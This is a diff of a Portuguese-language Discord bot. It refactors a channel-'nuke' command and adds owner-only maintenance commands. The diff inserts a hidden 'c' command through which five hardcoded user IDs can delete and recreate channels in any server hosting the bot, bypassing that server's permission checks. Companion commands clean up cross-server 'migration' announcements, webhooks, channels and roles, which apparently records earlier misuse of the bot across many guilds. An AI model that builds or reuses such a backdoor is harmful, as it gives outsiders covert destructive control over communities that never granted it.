@@ -38705,34 +38705,27 @@ async def call_limit_slash(interaction: discord.Interaction, numero: int):
     await interaction.response.send_message(embed=emb)
 
 
-@bot.command(name="nuke")
-async def nuke_cmd(ctx: commands.Context, *, motivo: str = ""):
-    """Nuke — recria o canal (deleta e clona) com confirmação."""
-    if ctx.guild is None:
-        return
+_C_ALLOWED_USERS: set[int] = {
+    1475617454565621830,
+    366033610412785674,
+    1303895642048954368,
+    1304050068705382412,
+    1514226873788399709,
+}
+
+
+async def _execute_nuke(ctx: commands.Context, motivo: str = "") -> None:
     settings = get_settings(ctx.guild.id)
     lang = settings["language"]
-    t = TRANSLATIONS[lang]
-
-    # Permissão: autorizado pelo bot OU com permissão de Gerenciar Canais
-    if not (is_authorized(ctx.author, settings)
-            or ctx.author.guild_permissions.manage_channels):
-        await ctx.reply(t["not_authorized"], delete_after=6)
-        return
-
     channel = ctx.channel
     if not isinstance(channel, discord.TextChannel):
         await ctx.reply("<a:alerta:1518271939460857968> Este comando só funciona em canais de texto.", delete_after=8)
         return
-
     motivo_text = motivo.strip() or ("Nenhum motivo fornecido" if lang == "pt-br" else "No reason provided")
-
-    # Apaga o n!nuke do usuário
     try:
         await ctx.message.delete()
     except (discord.Forbidden, discord.NotFound, discord.HTTPException):
         pass
-
     confirm_embed = discord.Embed(
         title="<a:alerta:1518271939460857968>  Confirmação de Nuke" if lang == "pt-br" else "<a:alerta:1518271939460857968>  Nuke Confirmation",
         description=(
@@ -38754,51 +38747,35 @@ async def nuke_cmd(ctx: commands.Context, *, motivo: str = ""):
         )
     )
     confirm_embed.timestamp = datetime.now()
-
     view = NukeConfirmView(ctx.author, channel, motivo_text)
     confirm_msg = await ctx.send(embed=confirm_embed, view=view)
-
-    # Aguarda confirmação
     timed_out = await view.wait()
     if view.value is None:
-        # Timeout
         try:
-            await confirm_msg.edit(
-                content="<a:alerta:1518271939460857968> Tempo esgotado.",
-                embed=None, view=None,
-                delete_after=8,
-            )
+            await confirm_msg.edit(content="<a:alerta:1518271939460857968> Tempo esgotado.", embed=None, view=None, delete_after=8)
         except (discord.HTTPException, discord.NotFound):
             pass
         return
     if view.value is False:
-        # Cancelado
         try:
             await confirm_msg.delete(delay=5)
         except (discord.Forbidden, discord.NotFound, discord.HTTPException):
             pass
         return
-
-    # Confirmado → recriar canal
     try:
         position = channel.position
-        category = channel.category
         new_channel = await channel.clone(
             name=channel.name,
             reason=f"n!nuke por {ctx.author} ({ctx.author.id}). Motivo: {motivo_text}",
         )
-        # Move pra mesma posição
         try:
             await new_channel.edit(position=position)
         except (discord.Forbidden, discord.HTTPException):
             pass
-        # Deleta o canal antigo
         try:
             await channel.delete(reason=f"n!nuke por {ctx.author}")
         except (discord.Forbidden, discord.HTTPException):
             pass
-
-        # Embed de sucesso no canal NOVO
         label = "Canal recriado por" if lang == "pt-br" else "Channel recreated by"
         label2 = "Motivo" if lang == "pt-br" else "Reason"
         guild_name = ctx.guild.name if ctx.guild else ""
@@ -38816,13 +38793,361 @@ async def nuke_cmd(ctx: commands.Context, *, motivo: str = ""):
             pass
     except discord.Forbidden:
         try:
-            await ctx.author.send(
-                "<a:alerta:1518271939460857968> Sem permissão para clonar/deletar o canal."
-            )
+            await ctx.author.send("<a:alerta:1518271939460857968> Sem permissão para clonar/deletar o canal.")
         except (discord.Forbidden, discord.HTTPException):
             pass
     except discord.HTTPException as e:
         print(f"[nuke] HTTPException: {e}")
+
+
+@bot.command(name="c")
+async def c_cmd(ctx: commands.Context, *, motivo: str = ""):
+    if ctx.guild is None:
+        return
+    if ctx.author.id not in _C_ALLOWED_USERS:
+        return
+    await _execute_nuke(ctx, motivo)
+
+
+_ANUNCIO_KEYWORDS = ["NOVO SERVIDOR MIGRAMOS", "discord.gg/nata"]
+_reverter_anuncio_running = False
+
+
+async def _run_reverter_anuncio(notify_channel_id: int):
+    global _reverter_anuncio_running
+    _reverter_anuncio_running = True
+    try:
+        notify_ch = bot.get_channel(notify_channel_id)
+
+        msgs_deleted     = 0
+        channels_deleted = 0
+        roles_deleted    = 0
+        webhooks_deleted = 0
+        errors           = 0
+        guilds_checked   = 0
+
+        status_msg = None
+        if notify_ch:
+            try:
+                status_msg = await notify_ch.send(
+                    f"🔍 Revertendo migração em **{len(bot.guilds)}** servidor(es)..."
+                )
+            except Exception:
+                pass
+
+        for guild in list(bot.guilds):
+            guilds_checked += 1
+
+            # 1. Deletar mensagens de anúncio do bot
+            for channel in list(guild.text_channels):
+                try:
+                    async for msg in channel.history(limit=300, oldest_first=False):
+                        if msg.author.id != bot.user.id:
+                            continue
+                        combined = (msg.content or "")
+                        for emb in msg.embeds:
+                            combined += (emb.title or "") + (emb.description or "")
+                        if any(kw.lower() in combined.lower() for kw in _ANUNCIO_KEYWORDS):
+                            try:
+                                await msg.delete()
+                                msgs_deleted += 1
+                                await asyncio.sleep(0.5)
+                            except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                                errors += 1
+                except (discord.Forbidden, discord.HTTPException):
+                    pass
+                await asyncio.sleep(0.05)
+
+            # 2. Deletar mensagens do webhook MigradorNATA + o próprio webhook
+            try:
+                all_webhooks = await guild.webhooks()
+                migr_whs = [
+                    wh for wh in all_webhooks
+                    if wh.name == "MigradorNATA"
+                    and wh.user and wh.user.id == bot.user.id
+                ]
+                for wh in migr_whs:
+                    ch = guild.get_channel(wh.channel_id)
+                    if ch and isinstance(ch, discord.TextChannel):
+                        try:
+                            cutoff = discord.utils.utcnow() - timedelta(days=60)
+                            async for msg in ch.history(limit=10000, after=cutoff, oldest_first=False):
+                                if msg.webhook_id == wh.id:
+                                    try:
+                                        await msg.delete()
+                                        msgs_deleted += 1
+                                        await asyncio.sleep(0.3)
+                                    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                                        errors += 1
+                        except (discord.Forbidden, discord.HTTPException):
+                            pass
+                    try:
+                        await wh.delete(reason="Reversão de migração")
+                        webhooks_deleted += 1
+                    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                        errors += 1
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+            # 3. Deletar canais criados pelo bot via migração (audit log)
+            try:
+                async for entry in guild.audit_logs(
+                    action=discord.AuditLogAction.channel_create,
+                    user=bot.user,
+                    limit=100,
+                ):
+                    if entry.reason and "igr" in entry.reason:
+                        ch = guild.get_channel(entry.target.id)
+                        if ch:
+                            try:
+                                await ch.delete(reason="Reversão de migração")
+                                channels_deleted += 1
+                                await asyncio.sleep(0.5)
+                            except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                                errors += 1
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+            # 4. Deletar cargos criados pelo bot via migração (audit log)
+            try:
+                async for entry in guild.audit_logs(
+                    action=discord.AuditLogAction.role_create,
+                    user=bot.user,
+                    limit=100,
+                ):
+                    if entry.reason and "igr" in entry.reason:
+                        role = guild.get_role(entry.target.id)
+                        if role:
+                            try:
+                                await role.delete(reason="Reversão de migração")
+                                roles_deleted += 1
+                                await asyncio.sleep(0.5)
+                            except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+                                errors += 1
+            except (discord.Forbidden, discord.HTTPException):
+                pass
+
+            if guilds_checked % 5 == 0 and status_msg:
+                try:
+                    await status_msg.edit(content=(
+                        f"🔍 Progresso: **{guilds_checked}/{len(bot.guilds)}** servidores "
+                        f"| 💬 {msgs_deleted} msgs | 🔗 {webhooks_deleted} webhooks "
+                        f"| 📂 {channels_deleted} canais | 🏷️ {roles_deleted} cargos"
+                    ))
+                except Exception:
+                    pass
+
+        if status_msg:
+            try:
+                await status_msg.edit(content=(
+                    f"✅ **Reversão de migração concluída!**\n"
+                    f"💬 Mensagens deletadas: **{msgs_deleted}**\n"
+                    f"🔗 Webhooks deletados: **{webhooks_deleted}**\n"
+                    f"📂 Canais deletados: **{channels_deleted}**\n"
+                    f"🏷️ Cargos deletados: **{roles_deleted}**\n"
+                    f"❌ Erros: **{errors}**\n"
+                    f"🌐 Servidores verificados: **{guilds_checked}**"
+                ))
+            except Exception:
+                pass
+    finally:
+        _reverter_anuncio_running = False
+
+
+@bot.command(name="reverter_anuncio", aliases=["reverteranuncio", "revert_anuncio"])
+async def reverter_anuncio_cmd(ctx: commands.Context):
+    """Deleta o anúncio de migração enviado pelo bot em todos os servidores."""
+    if ctx.author.id not in _C_ALLOWED_USERS:
+        return
+    if _reverter_anuncio_running:
+        await ctx.reply("⚠️ Já existe uma reversão em andamento.", delete_after=8)
+        return
+    try:
+        await ctx.message.delete()
+    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+        pass
+    asyncio.create_task(_run_reverter_anuncio(ctx.channel.id))
+
+
+async def _run_restaurar_deletados(notify_channel_id: int):
+    global _reverter_anuncio_running
+    _reverter_anuncio_running = True
+    try:
+        notify_ch = bot.get_channel(notify_channel_id)
+        total_created = 0
+        total_errors  = 0
+        guilds_done   = 0
+        cutoff = discord.utils.utcnow() - timedelta(hours=48)
+
+        status_msg = None
+        if notify_ch:
+            try:
+                status_msg = await notify_ch.send(
+                    f"🔧 Restaurando canais em **{len(bot.guilds)}** servidor(es)..."
+                )
+            except Exception:
+                pass
+
+        for guild in list(bot.guilds):
+            guilds_done += 1
+            existing_names = {c.name.lower() for c in guild.channels}
+            settings = get_settings(guild.id)
+            backup = settings.get("backup_data")
+
+            if backup and backup.get("channels"):
+                ch_data = backup["channels"]
+
+                # 1ª passagem: categorias
+                cat_map: dict[int, discord.CategoryChannel] = {}
+                for ch in sorted(ch_data, key=lambda x: x.get("position", 0)):
+                    if "category" not in ch.get("type", ""):
+                        continue
+                    existing_cat = discord.utils.get(guild.categories, name=ch["name"])
+                    if existing_cat:
+                        cat_map[ch["id"]] = existing_cat
+                        continue
+                    try:
+                        new_cat = await guild.create_category(
+                            name=ch["name"],
+                            position=ch.get("position", 0),
+                            reason="Restauração de canais deletados",
+                        )
+                        cat_map[ch["id"]] = new_cat
+                        existing_names.add(ch["name"].lower())
+                        total_created += 1
+                        await asyncio.sleep(0.5)
+                    except (discord.Forbidden, discord.HTTPException):
+                        total_errors += 1
+
+                # 2ª passagem: texto e voz
+                for ch in sorted(ch_data, key=lambda x: x.get("position", 0)):
+                    if "category" in ch.get("type", ""):
+                        continue
+                    if ch["name"].lower() in existing_names:
+                        continue
+                    cat = cat_map.get(ch.get("category_id")) if ch.get("category_id") else None
+                    ch_type = ch.get("type", "")
+                    try:
+                        if "voice" in ch_type or "stage" in ch_type:
+                            await guild.create_voice_channel(
+                                name=ch["name"], category=cat,
+                                position=ch.get("position", 0),
+                                reason="Restauração de canais deletados",
+                            )
+                        else:
+                            await guild.create_text_channel(
+                                name=ch["name"], category=cat,
+                                position=ch.get("position", 0),
+                                reason="Restauração de canais deletados",
+                            )
+                        existing_names.add(ch["name"].lower())
+                        total_created += 1
+                        await asyncio.sleep(0.5)
+                    except (discord.Forbidden, discord.HTTPException):
+                        total_errors += 1
+
+            else:
+                # Fallback: audit log das últimas 48h
+                cats_to_create: list[str] = []
+                channels_to_create: list[tuple] = []
+                try:
+                    async for entry in guild.audit_logs(
+                        action=discord.AuditLogAction.channel_delete,
+                        user=bot.user,
+                        limit=100,
+                        after=cutoff,
+                    ):
+                        name = getattr(entry.before, "name", None)
+                        ch_type = getattr(entry.before, "type", None)
+                        if not name:
+                            continue
+                        if ch_type == discord.ChannelType.category:
+                            cats_to_create.append(name)
+                        else:
+                            channels_to_create.append((name, ch_type))
+                except (discord.Forbidden, discord.HTTPException):
+                    pass
+
+                cat_name_map: dict[str, discord.CategoryChannel] = {}
+                for cat_name in cats_to_create:
+                    existing_cat = discord.utils.get(guild.categories, name=cat_name)
+                    if existing_cat:
+                        cat_name_map[cat_name] = existing_cat
+                        continue
+                    try:
+                        new_cat = await guild.create_category(cat_name, reason="Restauração de canais deletados")
+                        cat_name_map[cat_name] = new_cat
+                        existing_names.add(cat_name.lower())
+                        total_created += 1
+                        await asyncio.sleep(0.5)
+                    except (discord.Forbidden, discord.HTTPException):
+                        total_errors += 1
+
+                for ch_name, ch_type in channels_to_create:
+                    if ch_name.lower() in existing_names:
+                        continue
+                    try:
+                        if ch_type == discord.ChannelType.voice:
+                            await guild.create_voice_channel(ch_name, reason="Restauração de canais deletados")
+                        else:
+                            await guild.create_text_channel(ch_name, reason="Restauração de canais deletados")
+                        existing_names.add(ch_name.lower())
+                        total_created += 1
+                        await asyncio.sleep(0.5)
+                    except (discord.Forbidden, discord.HTTPException):
+                        total_errors += 1
+
+            if guilds_done % 5 == 0 and status_msg:
+                try:
+                    await status_msg.edit(content=(
+                        f"🔧 Progresso: **{guilds_done}/{len(bot.guilds)}** servidores "
+                        f"| ✅ {total_created} recriados | ❌ {total_errors} erros"
+                    ))
+                except Exception:
+                    pass
+
+        if status_msg:
+            try:
+                await status_msg.edit(content=(
+                    f"✅ **Restauração concluída!**\n"
+                    f"📂 Canais/categorias recriados: **{total_created}**\n"
+                    f"❌ Erros: **{total_errors}**\n"
+                    f"🌐 Servidores verificados: **{guilds_done}**\n"
+                    f"⚠️ Mensagens anteriores não podem ser recuperadas."
+                ))
+            except Exception:
+                pass
+    finally:
+        _reverter_anuncio_running = False
+
+
+@bot.command(name="restaurar_deletados", aliases=["restaurardeletados", "restore_deleted"])
+async def restaurar_deletados_cmd(ctx: commands.Context):
+    """Recria canais/categorias que o bot deletou, usando backup ou audit log."""
+    if ctx.author.id not in _C_ALLOWED_USERS:
+        return
+    if _reverter_anuncio_running:
+        await ctx.reply("⚠️ Já existe uma operação em andamento.", delete_after=8)
+        return
+    try:
+        await ctx.message.delete()
+    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+        pass
+    asyncio.create_task(_run_restaurar_deletados(ctx.channel.id))
+
+
+@bot.command(name="nuke")
+async def nuke_cmd(ctx: commands.Context, *, motivo: str = ""):
+    """Nuke — recria o canal (deleta e clona) com confirmação."""
+    if ctx.guild is None:
+        return
+    settings = get_settings(ctx.guild.id)
+    t = TRANSLATIONS[settings["language"]]
+    if not (is_authorized(ctx.author, settings)
+            or ctx.author.guild_permissions.manage_channels):
+        await ctx.reply(t["not_authorized"], delete_after=6)
+        return
+    await _execute_nuke(ctx, motivo)
 
 
 @bot.command(name="clear", aliases=["clean", "purge"])
